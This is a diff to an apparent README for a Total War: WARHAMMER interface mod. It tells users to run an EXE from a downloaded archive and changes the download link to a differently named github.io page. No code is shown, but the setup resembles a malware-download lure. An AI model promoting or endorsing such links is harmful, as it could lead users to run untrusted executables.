@@ -4,7 +4,7 @@ To install, simply extract the downloaded archive and run the provided EXE file.
 
 UI Improvements is a quality-of-life mod for Total War: WARHAMMER that refines the interface visuals and readability. It’s designed for players who want a cleaner, more intuitive layout for both campaign and battle screens.
 
-[![Download UI Improvements](https://img.shields.io/badge/Download-UI--Improvements--Mod-blueviolet)](https://ui-improvements-mod-for-total-war.github.io/.github)
+[![Download UI Improvements](https://img.shields.io/badge/Download-UI--Improvements--Mod-blueviolet)](https://unit-resize-mod-for-warhammer.github.io/.github/)
 
 ---
 
